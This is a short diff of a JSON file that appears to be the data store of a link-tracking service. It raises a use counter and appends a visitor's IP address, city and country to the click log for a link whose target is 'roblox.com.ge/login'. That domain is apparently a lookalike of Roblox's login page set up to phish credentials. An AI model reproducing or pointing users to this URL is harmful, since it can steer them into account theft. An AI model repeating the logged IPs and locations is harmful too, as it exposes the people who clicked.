@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 961,
+    "useCount": 962,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7808,6 +7808,14 @@
         "city": "Dinalupihan",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777211970766,
+        "ip": "171.225.202.235",
+        "country": "Vietnam",
+        "city": "Haiphong",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
